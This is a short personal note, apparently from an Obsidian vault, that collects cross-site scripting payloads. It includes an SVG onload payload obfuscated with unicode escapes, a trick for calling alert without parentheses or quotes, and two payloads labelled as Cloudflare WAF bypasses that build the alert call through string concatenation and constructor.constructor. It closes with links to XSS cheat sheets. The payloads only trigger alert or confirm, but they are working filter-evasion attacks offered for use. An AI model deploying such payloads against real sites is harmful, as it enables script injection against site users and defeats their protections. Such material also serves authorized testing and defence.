
![[Pasted image 20241018173908.png]]

```
<sVg/onfake="x=y"oNload=;1^(co\u006efirm)``^1//
```


> [!TIP]
```
alert() with no parenthesis, back ticks, brackets, quotes, braces, etc. by

[@stealthybugs](https://x.com/stealthybugs)

a=8,b=confirm,c=window,c.onerror=b;throw-a
```


# WAF Bypass

##### CLOUDFLARE
(https://x.com/XssPayloads/status/1465168176266846209)
```
<img/src=x onError="`${x}`;alert(`Ex.Mi`);">
```

```
onerror="x='ale';z='r';y='t';p='`XSS`';new constructor.constructor`zzz${`${x}${z}${y}${p}`}bbb`
```





> [!IMPORTANT]
https://tinyxss.terjanq.me/
https://gbhackers.com/top-500-important-xss-cheat-sheet/